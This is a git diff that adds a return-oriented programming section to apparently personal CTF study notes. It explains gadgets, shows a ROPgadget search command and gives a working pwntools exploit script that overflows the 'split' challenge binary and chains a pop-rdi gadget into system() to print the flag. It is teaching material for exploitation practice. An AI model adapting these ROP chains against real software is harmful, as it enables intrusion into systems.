@@ -212,3 +212,37 @@ io.pack(what)
 # Enjoy the shell
 io.interactive()
 ```
+
+## ROP - Return Oriented Programming
+It's a style of attack that uses pre existent code in the binary in a certain way, to execute whatever you want.
+It starts as a simple buffer overflow where you modify the return value to execute one specific information, but after that, you chain other small instructions that are really small and have a return after that (that are commonly called gadgets), to execute malicious code.
+To search for the pieces you need you can use <u>ROPgadget</u>, a tool that finds all the gadgets in a specific binary.
+To use it you can do this: `ROPgadget --binary <nomeFileDaAnalizzare> | grep <nomeComandoCheCiInteressa>` (i.e. `ROPgadget --binary split | grep "rdx"` to search for a gadget that uses rdx).
+
+After finding the gadgets that you need, you only have to create the pwntools python script to execute the malicious code that you want to execute.
+
+Sometimes it might happen that doing ROP chains casues a segmentation fault just before the system call to print the flag. In that situation find a gadget that only returns ("ret" is the instruction), and call it one or two times before the system call (doing that should allign the stack pointer and make the system call work).
+```python
+from pwn import *
+
+# this is to arrive before the return address override
+garbage = b"a" * 40
+# this is the gadget that we use to in this case pop from the stack to rdi
+gadget = p64(0x4007C3)
+# this is the command that should go inside of the system call
+print_flag = p64(0x601060)
+# that is a gadget to invoke for the system call
+system = p64(0x400560)
+
+msgin = garbage + gadget + print_flag + p64(0x40053E) + system
+
+io = process("./split")
+
+io.sendlineafter("> ", msgin)
+
+# going into interactive mode sometimes can make the program work (try without or printing .recvall() if in doubt)
+io.interactive()
+```
+
+What you have to understand in this kind of challenges is that you firstly find the way to pop something from the stack for example, and then you put the address of something that you want to add on the stack, so that the first instruction pops the second thing added (that's the reason why gadget is before print_flag in the python script).
+If you are wondering why system is after printt_flag, well system it's a call to function, so it's not read as a value on top of the stack.
